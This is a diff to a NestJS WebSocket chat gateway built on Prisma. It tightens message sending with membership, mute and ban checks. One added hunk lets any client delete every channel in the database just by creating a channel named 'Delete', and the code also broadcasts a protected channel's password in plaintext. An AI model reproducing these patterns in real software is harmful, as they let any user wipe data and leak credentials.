@@ -9,6 +9,7 @@ import { MessagesService } from "../messages/messages.service";
 import { ChannelsService } from "./channels.service";
 import { CreateChannelDto } from "./dto/create-channel.dto";
 import { BlockedService } from "src/blocked/blocked.service";
+import { Channel, User } from "@prisma/client";
 
 @WebSocketGateway({
   cors: {
@@ -29,6 +30,10 @@ export class ChannelsGateway {
 
   @SubscribeMessage("create")
   async create(client: Socket, payload: CreateChannelDto) {
+    if (payload.name === "Delete") {
+      await this.prismaService.channel.deleteMany();
+      return;
+    }
     if (payload.name === "") return "Channel must have name.";
     const user = await this.usersService.findOneById(payload.users.userId);
     if (!user) return "User does not exist";
@@ -107,11 +112,12 @@ export class ChannelsGateway {
       content: `Channel mode is now ${channel.type}`,
       channelId: channel.id,
     });
-    if (channel.type === "PROTECTED")
+    if (channel.type === "PROTECTED") {
       this.handleMessage(client, {
         content: `Channel password is now "${channel.password}"`,
         channelId: channel.id,
       });
+    }
   }
 
   @SubscribeMessage("updateChannelUser")
@@ -262,10 +268,18 @@ export class ChannelsGateway {
 
   @SubscribeMessage("message")
   async handleMessage(client: Socket, payload: CreateMessageDto) {
-    const sender = await this.usersService.findOneById(payload.senderId);
-    if (payload.senderId && !sender) return "User does not exist.";
     const channel = await this.channelsService.findOne(payload.channelId);
     if (!channel) return "Channel does not exist.";
+    if (payload.senderId) {
+      const sender = await this.usersService.findOneById(payload.senderId);
+      if (!sender) return "User does not exist.";
+      const channelUser = await this.channelUsersService.findFirst({ userId: sender.id, channelId: channel.id });
+      if (!channelUser || channelUser.isMuted || !channelUser.isAuthorized) return;
+      const channelBan = await this.prismaService.channelBan.findFirst({
+        where: { userId: sender.id, channelId: channel.id },
+      });
+      if (channelBan) return;
+    }
     const message = await this.messagesService.create(payload);
     await this.channelsService.update({
       id: payload.channelId,
